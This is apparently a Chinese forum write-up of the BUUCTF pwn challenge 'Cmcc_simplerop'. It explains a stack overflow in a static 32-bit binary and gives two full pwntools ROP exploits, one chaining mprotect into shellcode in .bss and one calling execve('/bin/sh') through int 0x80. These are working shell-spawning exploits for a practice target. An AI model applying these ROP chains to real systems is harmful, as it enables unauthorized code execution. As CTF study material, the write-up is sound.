
# [原创][BUUCTF]Cmcc_simplerop

## 题目复现

![图片描述](upload/attach/202201/945391_N5BJK22NS7FWW37.png)

函数很多，没有打印函数的`plt`,无法`ret2libc`

![图片描述](upload/attach/202201/945391_SNXC7H5QPTPYJ8A.png)

主函数可溢出

![图片描述](upload/attach/202201/945391_FXVG9UFTA73QAVJ.png)

存在`mprotect`，可以改变`bss`权限后，在`bss`写入`shell`代码

![图片描述](upload/attach/202201/945391_P78EUCM7ZEQJ6J9.png)

存在`int 0x80`,可以调整寄存器利用中断执行`sh`

![图片描述](upload/attach/202201/945391_B8KDX5MHSC3769A.png)

因此本题有两种思路

---

## 解题思路

- 方法一：

先用`mprotect`改写`bss`段权限，用`read`函数在`bss`段写入`shell`代码

- 方法二：

由于文件中没用`binsh`字符串，先用`read`函数在`bss`段写入`'/bin/sh'`，再调整寄存器执行`exec`函数

---

## 调试过程

### 方法一

先找`bss`段位置

![图片描述](upload/attach/202201/945391_ZPCE5SVG5U4V3J6.png)

`mprotect`参数如下，实际操作时`len`取`0x1000`，`addr`要略比实际靠前，取`0x80ef00`，`prot`取二进制`111`，即为`7`

![图片描述](upload/attach/202201/945391_Q864BA2BYXCV2A2.png)

执行完函数需要`pop3`执行后面的函数，都可以用

![图片描述](upload/attach/202201/945391_RKHGMJWHUSDVMQR.png)

`read`函数参数为`0`，`bss`地址，`0x100`

### 方法二

`int 80(eax,ebx,ecx,edx)`: `eax`为`11`，`ebx`为`'/bin/sh'`地址,`ecx`,`edx`缺省

![图片描述](upload/attach/202201/945391_W9H9NJR9CSEV4XY.png)

![图片描述](upload/attach/202201/945391_N9YRX3238X4FVBZ.png)

此题栈比较奇怪，与`ida`不符，需要自己调试，下面是调试技术的展示

![图片描述](upload/attach/202201/945391_GSDWY5JXKDFVFF7.png)

![图片描述](upload/attach/202201/945391_W4VJCE95D7P5J2X.png)

![图片描述](upload/attach/202201/945391_NYD3UZ8CJAX834B.png)

`gdb`断点应该更直观……偷懒没尝试了

得到`ret`地址位移为`0x20`，考虑原因：这道题应该不是我们平常做的`c`语言编译器得到的，`elf`结构比较奇怪，所以栈也有所不同

---

## Payload

### 方法一

```
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
io = process('./simplerop')
#io = remote('node4.buuoj.cn',25205)
elf = ELF('./simplerop')
main_addr = 0x8048e26
read_addr = 0x806cd50
#pop_eax = 0x80bae06
pop_edx_ecx_ebx = 0x806e850
#int80_addr = 0x80493e1
binsh_addr = 0x80eaf80
mprotect_addr = 0x806d870
#binsh_addr = 0x80eb584
payload = b'a'*0x20 + p32(mprotect_addr) + p32(pop_edx_ecx_ebx) + p32(0x80ea000) + p32(0x1000) + p32(7)
payload += p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x100)
payload += p32(binsh_addr)
io.sendlineafter('it',payload)
sleep(0.2)
payload2 = asm(shellcraft.sh())
io.sendline(payload2)
io.interactive()
```

### 方法二

```
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
io = process('./simplerop')
#io = remote('node4.buuoj.cn',25205)
elf = ELF('./simplerop')
main_addr = 0x8048e26
read_addr = 0x806cd50
pop_eax = 0x80bae06
pop_edx_ecx_ebx = 0x806e850
pop_ebx = 0x80481c9
int80_addr = 0x80493e1
binsh_addr = 0x80eaf80
#binsh_addr = 0x80eb584
payload = b'a' * 0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)
payload += p32(pop_eax) + p32(11) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) +p32(binsh_addr) + p32(int80_addr)
#payload += p32(pop_eax) + p32(11) + p32(pop_ebx) + p32(binsh_addr) + p32(int80_addr)
io.sendline(payload)
io.sendline(b'/bin/sh\x00')
io.interactive()
```

---

## 总结

1. 本题为除`ret2libc`外的两种`getshell`方式的展示:`int80`与`mprotect`改写权限

2. 学习了非常规栈位移的调试：在`elf`文件比较奇怪时，要用`gdb`进行位移调试

3. 没有解决的问题：法二中，网上`payload`设置`binsh`的地址，不能在本地调试到结果（远程却可以），报错“`set_thread_area` failed”，但`binsh`地址改为`bss`地址本地成功

4. 没有解决的问题：法二中，`ecx`,`edx`应该是可以缺省的，但我只`pop_ebx`就会报错“`set_thread_area` failed”

希望有师傅可以解决我愚昧的问题

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2022-1-24 01:04

被N1co5in3编辑，原因：

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)
